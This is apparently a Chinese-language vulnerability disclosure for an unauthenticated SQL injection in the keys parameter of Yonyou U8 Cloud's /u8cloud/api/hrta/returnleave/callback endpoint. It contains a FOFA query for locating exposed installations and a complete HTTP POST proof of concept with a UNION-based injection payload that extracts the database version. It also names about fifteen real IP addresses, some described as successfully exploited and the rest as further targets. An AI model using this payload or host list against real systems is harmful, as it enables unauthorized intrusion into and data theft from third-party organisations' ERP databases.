<img width="865" height="458" alt="image" src="https://github.com/user-attachments/assets/160c4011-3923-4778-897e-64f491944300" /># -U8cloud-returnleave-keys-SQL-

用友网络科技有限公司用友U8cloud系统returnleave接口keys参数存在前台SQL注入漏洞
用友网络科技股份有限公司U8 cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。该系统前台/u8cloud/api/hrta/returnleave/callback路径keys参数存在sql注入漏洞，可直接执行sql语句获取系统敏感信息
注：非/u8cloud/api/hrta/returnaway/callback 接口
二、资产测绘
fofa：app="用友-U8-Cloud"
 
厂商信息：
用友网络科技股份有限公司
https://yonyou.com/

POC：
POST /u8cloud/api/hrta/returnleave/callback HTTP/1.1
Host: 47.108.25.40:8089
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
system: 1
content-type: application/json
trantype: code
isEncrypt: N
needStackTrace: Y
Cookie: JSESSIONID=A6B682CF2E64D920760B5FF4F72EFCE7.server
Connection: keep-alive
{
  "pk_proposer": "1",
  "keys": ["1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(98)+CHAR(120)+CHAR(106)+CHAR(113)+ISNULL(CAST(@@VERSION AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(98)+CHAR(113),NULL,NULL-- CLgo"]
}
3 漏洞复现
案例1
http://47.108.25.40:8089/
 
测试获取当前数据库版本
 
案例2
http://47.103.8.30:8080/
 
获取当前数据库版本：
 
案例3
http://121.36.14.252:8888/
 
获取当前数据库版本
 
案例4
http://59.46.243.218:9080/
 
 
案例5
http://47.104.18.157:8888/
 
 
Fofa导出全网其余案例如下：
82.157.6.70
58.214.5.132:7078
60.217.78.22:83
1.116.164.133:8080
101.201.66.195:8086
119.167.82.246:8092
120.224.39.235:18080
49.7.61.142:7777
114.221.200.175:8858
124.70.84.131:8889
